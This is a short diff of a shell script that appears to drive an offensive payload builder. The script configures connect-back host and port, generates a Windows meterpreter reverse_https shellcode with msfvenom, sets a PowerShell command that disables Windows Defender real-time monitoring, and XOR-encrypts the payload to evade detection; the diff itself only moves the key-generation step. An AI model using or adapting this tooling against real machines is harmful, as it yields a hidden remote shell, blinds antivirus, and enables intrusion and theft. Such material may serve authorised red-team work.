@@ -27,6 +27,8 @@ cat banner.txt
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# generate key file
+generate_key preset aabbccddee input/key_raw.txt
 # enable debug output
 enable_debug_print
 #CONFIGURATION_END
@@ -39,8 +41,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x
 set_command_source static_from_here 'Set-MpPreference -DisableRealtimeMonitoring $true'
 set_command_exec exec_via_powershell
 
-# generate key file
-generate_key preset aabbccddee input/key_raw.txt
+
 
 # encrypt payload
 encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
